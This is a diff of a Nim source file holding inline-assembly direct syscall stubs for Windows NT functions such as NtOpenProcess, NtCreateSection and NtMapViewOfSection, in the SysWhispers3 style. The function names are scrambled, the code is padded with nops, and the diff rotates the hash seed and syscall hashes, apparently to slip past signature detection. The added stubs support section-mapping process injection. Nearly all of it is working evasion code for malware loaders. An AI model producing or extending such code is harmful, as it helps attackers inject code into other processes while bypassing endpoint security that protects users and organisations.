@@ -36,7 +36,7 @@ type
 
 #include <windows.h>
 
-#define SW3_SEED 0x6BE5F2CD
+#define SW3_SEED 0x6778958F
 #define SW3_ROL8(v) (v << 8 | v >> 24)
 #define SW3_ROR8(v) (v >> 8 | v << 24)
 #define SW3_ROX8(v) ((SW3_SEED % 2) ? SW3_ROL8(v) : SW3_ROR8(v))
@@ -358,7 +358,7 @@ proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T,
 	nop
     nop
     nop
-    mov ecx, 0x0B131CBD3
+    mov ecx, 0x08D149393
 	nop
     nop
     call Piep_GetSyNumber              
@@ -410,7 +410,7 @@ proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, Numb
     nop
     nop
     nop
-    mov ecx, 0x0FC9FE831
+    mov ecx, 0x00D951B1B
 	nop
     nop
     call Piep_GetSyNumber              
@@ -447,7 +447,7 @@ proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
     mov [rsp+32], r9
 	nop
     sub rsp, 0x28
-	mov ecx, 0x096BECC7C
+	mov ecx, 0x0123FDA68
 	nop
     call Piep_GetSyNumber              
 	nop
@@ -493,7 +493,7 @@ proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG,
 	nop
     nop
     nop
-    mov ecx, 0x0CE55C4D1
+    mov ecx, 0x037953903
 	nop
     nop
     call Piep_GetSyNumber              
@@ -539,7 +539,7 @@ proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG,
     nop
     ret
     """
-#opqiwepoausdasdjlenProcess
+# NtOpenProcess 
 proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx
@@ -562,7 +562,7 @@ proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, Obje
     nop
     nop
     sub rsp, 0x28
-	mov ecx, 0x001DF2A40
+	mov ecx, 0x0772D4886
 	nop
     nop
     nop
@@ -638,7 +638,7 @@ proc zuatzuastdiasyy*(ProcessHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     nop
     nop
     nop
-	mov ecx, 0x001DF2A40
+	mov ecx, 0x03E9D1F51
     nop
     nop
     nop
@@ -682,4 +682,44 @@ proc zuatzuastdiasyy*(ProcessHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     nop
     ret
     """
+
+# NtCreateSection
+proc iuhqdihasduiahsdaksdhak*(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+	mov [rsp +8], rcx          
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 0x28
+	mov ecx, 0x0802EAF73
+	call Piep_GetSyNumber              
+	add rsp, 0x28
+	mov rcx, [rsp+8]                      
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	syscall                    
+	ret
+    """
+# NtMapViewOfSection
+proc uihzasdbnqlpoasdlykxc*(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+	mov [rsp +8], rcx          
+	mov [rsp+16], rdx
+	mov [rsp+24], r8
+	mov [rsp+32], r9
+	sub rsp, 0x28
+	mov ecx, 0x0108B3217
+	call Piep_GetSyNumber              
+	add rsp, 0x28
+	mov rcx, [rsp+8]                      
+	mov rdx, [rsp+16]
+	mov r8, [rsp+24]
+	mov r9, [rsp+32]
+	mov r10, rcx
+	syscall                    
+	ret
+    """
+
 
